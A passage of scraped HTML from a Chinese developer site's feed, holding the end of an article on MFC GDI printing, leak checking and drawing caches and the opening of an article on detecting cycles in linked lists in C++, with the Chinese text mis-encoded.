<span class="hljs-keyword">private</span>:
    <span class="hljs-function"><span class="hljs-type">static</span> BYTE <span class="hljs-title">Clamp</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span>
    </span>{
        <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">255</span>;
        <span class="hljs-keyword">return</span> (BYTE)value;
    }
};
</code></pre>
<h3 data-id="heading-77">ä¸ƒã€æ‰“å°ä¸æ‰“å°é¢„è§ˆ</h3>
<h4 data-id="heading-78">7.1 æ‰“å°æ¶æ„çš„å®ç°</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ”¯æŒæ‰“å°çš„è§†å›¾ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CPrintableView</span> : <span class="hljs-keyword">public</span> CView
{
<span class="hljs-keyword">protected</span>:
    <span class="hljs-comment">// æ‰“å°ç›¸å…³æˆå‘˜</span>
    CPrintInfo m_printInfo;
    <span class="hljs-type">int</span> m_nPageWidth;
    <span class="hljs-type">int</span> m_nPageHeight;
    <span class="hljs-type">int</span> m_nCurPage;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnPreparePrinting</span><span class="hljs-params">(CPrintInfo* pInfo)</span>
    </span>{
        <span class="hljs-comment">// è®¾ç½®æ‰“å°å¯¹è¯æ¡†é»˜è®¤å€¼</span>
        pInfo-&gt;<span class="hljs-built_in">SetMaxPage</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// å‡è®¾æœ€å¤š10é¡µ</span>
        pInfo-&gt;<span class="hljs-built_in">SetMinPage</span>(<span class="hljs-number">1</span>);
        
        <span class="hljs-comment">// è°ƒç”¨DoPreparePrintingæ˜¾ç¤ºæ‰“å°å¯¹è¯æ¡†</span>
        <span class="hljs-built_in">DoPreparePrinting</span>(pInfo);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnBeginPrinting</span><span class="hljs-params">(CDC* pDC, CPrintInfo* pInfo)</span>
    </span>{
        <span class="hljs-comment">// è·å–æ‰“å°æœºDCèƒ½åŠ›</span>
        m_nPageWidth = pDC-&gt;<span class="hljs-built_in">GetDeviceCaps</span>(HORZRES);
        m_nPageHeight = pDC-&gt;<span class="hljs-built_in">GetDeviceCaps</span>(VERTRES);
        
        <span class="hljs-comment">// è®¡ç®—æ€»é¡µæ•°</span>
        CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
        <span class="hljs-type">int</span> nTotalLines = pDoc-&gt;<span class="hljs-built_in">GetLineCount</span>();
        <span class="hljs-type">int</span> nLinesPerPage = m_nPageHeight / <span class="hljs-number">20</span>; <span class="hljs-comment">// å‡è®¾æ¯è¡Œ20åƒç´ </span>
        
        pInfo-&gt;<span class="hljs-built_in">SetMaxPage</span>((nTotalLines + nLinesPerPage - <span class="hljs-number">1</span>) / nLinesPerPage);
        
        <span class="hljs-comment">// åˆ›å»ºæ‰“å°å­—ä½“</span>
        LOGFONT lfPrint = {<span class="hljs-number">0</span>};
        lfPrint.lfHeight = <span class="hljs-number">-15</span>; <span class="hljs-comment">// æ‰“å°å­—ä½“ç¨å°</span>
        lfPrint.lfWeight = FW_NORMAL;
        <span class="hljs-built_in">lstrcpy</span>(lfPrint.lfFaceName, _T(<span class="hljs-string">"å®‹ä½“"</span>));
        m_fontPrint.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lfPrint);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnPrint</span><span class="hljs-params">(CDC* pDC, CPrintInfo* pInfo)</span>
    </span>{
        m_nCurPage = pInfo-&gt;m_nCurPage;
        
        <span class="hljs-comment">// è®¾ç½®æ˜ å°„æ¨¡å¼</span>
        pDC-&gt;<span class="hljs-built_in">SetMapMode</span>(MM_TEXT);
        
        <span class="hljs-comment">// è®¾ç½®å­—ä½“</span>
        CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;m_fontPrint);
        
        <span class="hljs-comment">// æ‰“å°é¡µçœ‰</span>
        <span class="hljs-built_in">PrintHeader</span>(pDC);
        
        <span class="hljs-comment">// æ‰“å°å†…å®¹</span>
        <span class="hljs-built_in">PrintPageContent</span>(pDC, pInfo-&gt;m_nCurPage);
        
        <span class="hljs-comment">// æ‰“å°é¡µè„š</span>
        <span class="hljs-built_in">PrintFooter</span>(pDC);
        
        pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnEndPrinting</span><span class="hljs-params">(CDC* <span class="hljs-comment">/*pDC*/</span>, CPrintInfo* <span class="hljs-comment">/*pInfo*/</span>)</span>
    </span>{
        <span class="hljs-comment">// æ¸…ç†æ‰“å°èµ„æº</span>
        m_fontPrint.<span class="hljs-built_in">DeleteObject</span>();
    }
    
<span class="hljs-keyword">protected</span>:
    CFont m_fontPrint;
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintHeader</span><span class="hljs-params">(CDC* pDC)</span>
    </span>{
        CString strHeader;
        strHeader.<span class="hljs-built_in">Format</span>(_T(<span class="hljs-string">"ç¬¬ %d é¡µ"</span>), m_nCurPage);
        
        pDC-&gt;<span class="hljs-built_in">TextOut</span>(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, strHeader);
        
        <span class="hljs-comment">// ç»˜åˆ¶é¡µçœ‰çº¿</span>
        pDC-&gt;<span class="hljs-built_in">MoveTo</span>(<span class="hljs-number">50</span>, <span class="hljs-number">80</span>);
        pDC-&gt;<span class="hljs-built_in">LineTo</span>(m_nPageWidth - <span class="hljs-number">50</span>, <span class="hljs-number">80</span>);
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintPageContent</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">int</span> nPage)</span>
    </span>{
        CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
        
        <span class="hljs-comment">// è®¡ç®—æœ¬é¡µæ˜¾ç¤ºçš„è¡ŒèŒƒå›´</span>
        <span class="hljs-type">int</span> nLinesPerPage = (m_nPageHeight - <span class="hljs-number">150</span>) / <span class="hljs-number">20</span>; <span class="hljs-comment">// è€ƒè™‘é¡µçœ‰é¡µè„š</span>
        <span class="hljs-type">int</span> nStartLine = (nPage - <span class="hljs-number">1</span>) * nLinesPerPage;
        <span class="hljs-type">int</span> nEndLine = <span class="hljs-built_in">min</span>(nStartLine + nLinesPerPage, 
                          pDoc-&gt;<span class="hljs-built_in">GetLineCount</span>());
        
        <span class="hljs-comment">// é€è¡Œæ‰“å°</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = nStartLine; i &lt; nEndLine; i++)
        {
            <span class="hljs-type">int</span> y = <span class="hljs-number">100</span> + (i - nStartLine) * <span class="hljs-number">20</span>;
            pDC-&gt;<span class="hljs-built_in">TextOut</span>(<span class="hljs-number">100</span>, y, pDoc-&gt;<span class="hljs-built_in">GetLine</span>(i));
        }
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintFooter</span><span class="hljs-params">(CDC* pDC)</span>
    </span>{
        CString strFooter = CTime::<span class="hljs-built_in">GetCurrentTime</span>().<span class="hljs-built_in">Format</span>(_T(<span class="hljs-string">"%Y-%m-%d %H:%M:%S"</span>));
        
        <span class="hljs-comment">// ç»˜åˆ¶é¡µè„šçº¿</span>
        pDC-&gt;<span class="hljs-built_in">MoveTo</span>(<span class="hljs-number">50</span>, m_nPageHeight - <span class="hljs-number">70</span>);
        pDC-&gt;<span class="hljs-built_in">LineTo</span>(m_nPageWidth - <span class="hljs-number">50</span>, m_nPageHeight - <span class="hljs-number">70</span>);
        
        <span class="hljs-comment">// æ‰“å°é¡µè„šæ–‡æœ¬</span>
        pDC-&gt;<span class="hljs-built_in">TextOut</span>(<span class="hljs-number">100</span>, m_nPageHeight - <span class="hljs-number">50</span>, strFooter);
    }
};
</code></pre>
<h3 data-id="heading-79">å…«ã€æ€§èƒ½ä¼˜åŒ–ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-80">8.1 GDIèµ„æºæ³„æ¼æ£€æµ‹</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CGdiLeakDetector</span>
{
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">static</span> <span class="hljs-type">int</span> m_nGdiObjectsStart;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CGdiLeakDetector</span>()
    {
        <span class="hljs-comment">// è®°å½•åˆå§‹GDIå¯¹è±¡æ•°é‡</span>
        m_nGdiObjectsStart = <span class="hljs-built_in">GetGuiResources</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), 
                                            GR_GDIOBJECTS);
    }
    
    ~<span class="hljs-built_in">CGdiLeakDetector</span>()
    {
        <span class="hljs-comment">// æ£€æŸ¥GDIå¯¹è±¡æ³„æ¼</span>
        <span class="hljs-type">int</span> nGdiObjectsEnd = <span class="hljs-built_in">GetGuiResources</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), 
                                            GR_GDIOBJECTS);
        
        <span class="hljs-keyword">if</span> (nGdiObjectsEnd &gt; m_nGdiObjectsStart)
        {
            <span class="hljs-built_in">TRACE</span>(_T(<span class="hljs-string">"è­¦å‘Šï¼šæ£€æµ‹åˆ°å¯èƒ½çš„GDIå¯¹è±¡æ³„æ¼ã€‚\n"</span>));
            <span class="hljs-built_in">TRACE</span>(_T(<span class="hljs-string">"åˆå§‹: %d, ç»“æŸ: %d, æ³„æ¼: %d\n"</span>), 
                  m_nGdiObjectsStart, nGdiObjectsEnd,
                  nGdiObjectsEnd - m_nGdiObjectsStart);
            
            <span class="hljs-comment">// åœ¨è°ƒè¯•æ—¶è§¦å‘æ–­ç‚¹</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsDebuggerPresent</span>())
            {
                <span class="hljs-built_in">DebugBreak</span>();
            }
        }
    }
};

<span class="hljs-comment">// åœ¨åº”ç”¨ç¨‹åºç±»ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyApp</span> : <span class="hljs-keyword">public</span> CWinApp
{
<span class="hljs-keyword">private</span>:
    CGdiLeakDetector m_gdiDetector;
    <span class="hljs-comment">// ...</span>
};
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
</code></pre>
<h4 data-id="heading-81">8.2 ç»˜å›¾ç¼“å­˜ä¸å¢é‡æ›´æ–°</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CDrawingCache</span>
{
<span class="hljs-keyword">private</span>:
    CBitmap m_bmpCache;        <span class="hljs-comment">// ç¼“å­˜ä½å›¾</span>
    CRect m_rectCache;         <span class="hljs-comment">// ç¼“å­˜åŒºåŸŸ</span>
    BOOL m_bCacheValid;        <span class="hljs-comment">// ç¼“å­˜æœ‰æ•ˆæ€§æ ‡å¿—</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CDrawingCache</span>() : <span class="hljs-built_in">m_bCacheValid</span>(FALSE) {}
    
    <span class="hljs-comment">// æ›´æ–°ç¼“å­˜</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UpdateCache</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">const</span> CRect&amp; rect)</span>
    </span>{
        <span class="hljs-keyword">if</span> (!m_bCacheValid || m_rectCache != rect)
        {
            <span class="hljs-comment">// åˆ›å»ºæˆ–é‡æ–°åˆ›å»ºç¼“å­˜ä½å›¾</span>
            <span class="hljs-keyword">if</span> (m_bmpCache.<span class="hljs-built_in">GetSafeHandle</span>() == <span class="hljs-literal">NULL</span> || 
                m_rectCache != rect)
            {
                m_bmpCache.<span class="hljs-built_in">DeleteObject</span>();
                m_bmpCache.<span class="hljs-built_in">CreateCompatibleBitmap</span>(pDC, 
                                                 rect.<span class="hljs-built_in">Width</span>(), 
                                                 rect.<span class="hljs-built_in">Height</span>());
                m_rectCache = rect;
            }
            
            <span class="hljs-comment">// ç»˜åˆ¶åˆ°ç¼“å­˜</span>
            CDC dcCache;
            dcCache.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
            CBitmap* pOldBmp = dcCache.<span class="hljs-built_in">SelectObject</span>(&amp;m_bmpCache);
            
            <span class="hljs-comment">// ç»˜åˆ¶èƒŒæ™¯å’Œå†…å®¹åˆ°ç¼“å­˜</span>
            <span class="hljs-built_in">DrawToCache</span>(&amp;dcCache, rect);
            
            dcCache.<span class="hljs-built_in">SelectObject</span>(pOldBmp);
            m_bCacheValid = TRUE;
        }
    }
    
    <span class="hljs-comment">// ä»ç¼“å­˜ç»˜åˆ¶åˆ°å±å¹•</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RenderFromCache</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">const</span> CPoint&amp; ptDest)</span>
    </span>{
        <span class="hljs-keyword">if</span> (m_bCacheValid)
        {
            CDC dcCache;
            dcCache.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
            CBitmap* pOldBmp = dcCache.<span class="hljs-built_in">SelectObject</span>(&amp;m_bmpCache);
            
            pDC-&gt;<span class="hljs-built_in">BitBlt</span>(ptDest.x, ptDest.y, 
                       m_rectCache.<span class="hljs-built_in">Width</span>(), m_rectCache.<span class="hljs-built_in">Height</span>(),
                       &amp;dcCache, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCCOPY);
            
            dcCache.<span class="hljs-built_in">SelectObject</span>(pOldBmp);
        }
    }
    
    <span class="hljs-comment">// ä½¿ç¼“å­˜å¤±æ•ˆ</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvalidateCache</span><span class="hljs-params">()</span>
    </span>{
        m_bCacheValid = FALSE;
    }
    
    <span class="hljs-comment">// éƒ¨åˆ†ç¼“å­˜å¤±æ•ˆ</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvalidateCacheRect</span><span class="hljs-params">(<span class="hljs-type">const</span> CRect&amp; rectInvalid)</span>
    </span>{
        <span class="hljs-keyword">if</span> (m_bCacheValid &amp;&amp; m_rectCache.<span class="hljs-built_in">IntersectRect</span>(&amp;rectInvalid))
        {
            <span class="hljs-comment">// åªé‡æ–°ç»˜åˆ¶å—å½±å“çš„éƒ¨åˆ†</span>
            CDC dcCache;
            <span class="hljs-function">CClientDC <span class="hljs-title">dcScreen</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;
            dcCache.<span class="hljs-built_in">CreateCompatibleDC</span>(&amp;dcScreen);
            CBitmap* pOldBmp = dcCache.<span class="hljs-built_in">SelectObject</span>(&amp;m_bmpCache);
            
            <span class="hljs-comment">// æ¸…é™¤å—å½±å“åŒºåŸŸ</span>
            <span class="hljs-function">CBrush <span class="hljs-title">brushBg</span><span class="hljs-params">(RGB(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))</span></span>;
            dcCache.<span class="hljs-built_in">FillRect</span>(&amp;rectInvalid, &amp;brushBg);
            
            <span class="hljs-comment">// é‡æ–°ç»˜åˆ¶å—å½±å“åŒºåŸŸ</span>
            <span class="hljs-built_in">RedrawInvalidArea</span>(&amp;dcCache, rectInvalid);
            
            dcCache.<span class="hljs-built_in">SelectObject</span>(pOldBmp);
        }
    }
    
<span class="hljs-keyword">protected</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DrawToCache</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">const</span> CRect&amp; rect)</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">RedrawInvalidArea</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">const</span> CRect&amp; rect)</span> </span>= <span class="hljs-number">0</span>;
};
</code></pre>
<h3 data-id="heading-82">ä¹ã€ä¸ç°ä»£å›¾å½¢APIçš„å¯¹æ¯”</h3>
<p>è™½ç„¶GDIå·²ç»é€æ¸è¢«Direct2Dã€DirectWriteç­‰ç°ä»£å›¾å½¢APIå–ä»£ï¼Œä½†ç†è§£GDIçš„è®¾è®¡ä»æœ‰ä»·å€¼ï¼š</p>
<ol>
<li><strong>è®¾å¤‡æŠ½è±¡å±‚</strong>ï¼šGDIçš„è®¾å¤‡ä¸Šä¸‹æ–‡æ¦‚å¿µå½±å“äº†åç»­APIçš„è®¾è®¡</li>
<li><strong>èµ„æºç®¡ç†æ¨¡å‹</strong>ï¼šGDIå¯¹è±¡çš„åˆ›å»º/é€‰æ‹©/åˆ é™¤æ¨¡å¼ä¸ºåæ¥çš„èµ„æºç®¡ç†æä¾›äº†å‚è€ƒ</li>
<li><strong>åæ ‡ç³»ç»Ÿ</strong>ï¼šGDIçš„æ˜ å°„æ¨¡å¼ä¸ºå›¾å½¢å˜æ¢å¥ å®šäº†åŸºç¡€</li>
</ol>
<p><strong>è¿ç§»ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>å¯¹äºæ–°é¡¹ç›®ï¼Œæ¨èä½¿ç”¨Direct2D/DirectWriteæˆ–è·¨å¹³å°å›¾å½¢åº“</li>
<li>å¯¹äºç°æœ‰MFCé¡¹ç›®ï¼Œå¯é€æ­¥æ›¿æ¢ç»˜å›¾ä»£ç ï¼ŒåŒæ—¶ä¿ç•™ä¸šåŠ¡é€»è¾‘</li>
<li>GDIä»é€‚ç”¨äºç®€å•çš„UIç»˜åˆ¶å’Œæ‰“å°åŠŸèƒ½</li>
</ul>
<p>MFCçš„GDIç¼–ç¨‹ä»£è¡¨äº†Windowså›¾å½¢ç¼–ç¨‹çš„ä¸€ä¸ªæ—¶ä»£ï¼Œè™½ç„¶æŠ€æœ¯å·²ç»æ¼”è¿›ï¼Œä½†å…¶è®¾è®¡æ€æƒ³å’Œé—®é¢˜è§£å†³æ–¹æ¡ˆä»å¯¹ç†è§£è®¡ç®—æœºå›¾å½¢å­¦åŸºæœ¬åŸç†æœ‰é‡è¦ä»·å€¼ã€‚æŒæ¡GDIä¸ä»…æœ‰åŠ©äºç»´æŠ¤é—ç•™ä»£ç ï¼Œæ›´èƒ½æ·±åˆ»ç†è§£å›¾å½¢ç³»ç»Ÿçš„å·¥ä½œæœºåˆ¶ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++é“¾è¡¨ç¯æ£€æµ‹ç®—æ³•å®Œå…¨è§£æ]]></title>    <link>https://juejin.cn/post/7581676787379650579</link>    <guid>https://juejin.cn/post/7581676787379650579</guid>    <pubDate>2025-12-09T10:16:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581676787379650579" data-draft-id="7581676787379634195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++é“¾è¡¨ç¯æ£€æµ‹ç®—æ³•å®Œå…¨è§£æ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T10:16:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++é“¾è¡¨ç¯æ£€æµ‹ç®—æ³•å®Œå…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T10:16:03.000Z" title="Tue Dec 09 2025 10:16:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€é—®é¢˜å®šä¹‰</h2>
<h3 data-id="heading-1">1.1 é“¾è¡¨ç¯é—®é¢˜</h3>
<p>é“¾è¡¨ç¯ï¼ˆLinked List Cycleï¼‰æŒ‡é“¾è¡¨ä¸­æŸä¸ªèŠ‚ç‚¹çš„ next æŒ‡é’ˆæŒ‡å‘äº†é“¾è¡¨ä¸­åœ¨å®ƒä¹‹å‰å‡ºç°çš„èŠ‚ç‚¹ï¼Œå¯¼è‡´é“¾è¡¨å½¢æˆé—­ç¯ç»“æ„ã€‚æ£€æµ‹é“¾è¡¨ç¯æ˜¯æ•°æ®ç»“æ„ä¸ç®—æ³•ä¸­çš„ç»å…¸é—®é¢˜ï¼Œåœ¨å†…å­˜ç®¡ç†ã€ç¼–è¯‘å™¨ä¼˜åŒ–ã€å›¾ç®—æ³•ç­‰é¢†åŸŸæœ‰å¹¿æ³›åº”ç”¨ã€‚</p>
<h3 data-id="heading-2">1.2 é—®é¢˜å½¢å¼åŒ–</h3>
<p>ç»™å®šä¸€ä¸ªå•é“¾è¡¨çš„å¤´èŠ‚ç‚¹ <code>head</code>ï¼Œè¦æ±‚ï¼š</p>
<ol>
<li>åˆ¤æ–­é“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨ç¯</li>
<li>å¦‚æœå­˜åœ¨ç¯ï¼Œæ‰¾åˆ°ç¯çš„å…¥å£èŠ‚ç‚¹</li>
<li>åˆ†æç®—æ³•çš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦</li>
</ol>
<h2 data-id="heading-3">äºŒã€æ ¸å¿ƒç®—æ³•åŸç†</h2>
<h3 data-id="heading-4">2.1 å“ˆå¸Œè¡¨æ³•ï¼ˆæ ‡è®°æ³•ï¼‰</h3>
<h4 data-id="heading-5">2.1.1 åŸºæœ¬æ€æƒ³</h4>
<p>éå†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå°†è®¿é—®è¿‡çš„èŠ‚ç‚¹å­˜å‚¨åœ¨å“ˆå¸Œé›†åˆä¸­ã€‚å¦‚æœå½“å‰èŠ‚ç‚¹å·²ç»åœ¨é›†åˆä¸­ï¼Œè¯´æ˜é“¾è¡¨æœ‰ç¯ï¼›å¦‚æœéå†åˆ°é“¾è¡¨æœ«å°¾ï¼ˆnullptrï¼‰ï¼Œåˆ™æ— ç¯ã€‚</p>
<h4 data-id="heading-6">2.1.2 ç®—æ³•æ­¥éª¤</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-number">1.</span> åˆå§‹åŒ–ç©ºå“ˆå¸Œé›†åˆ visited
<span class="hljs-number">2.</span> å½“å‰æŒ‡é’ˆ <span class="hljs-keyword">current</span> æŒ‡å‘å¤´èŠ‚ç‚¹ head
<span class="hljs-number">3.</span> while <span class="hljs-keyword">current</span> <span class="hljs-operator">!=</span> nullptr:
   a. å¦‚æœ <span class="hljs-keyword">current</span> åœ¨ visited ä¸­ï¼Œè¿”å› <span class="hljs-literal">true</span>ï¼ˆæœ‰ç¯ï¼‰
   b. å°† <span class="hljs-keyword">current</span> åŠ å…¥ visited
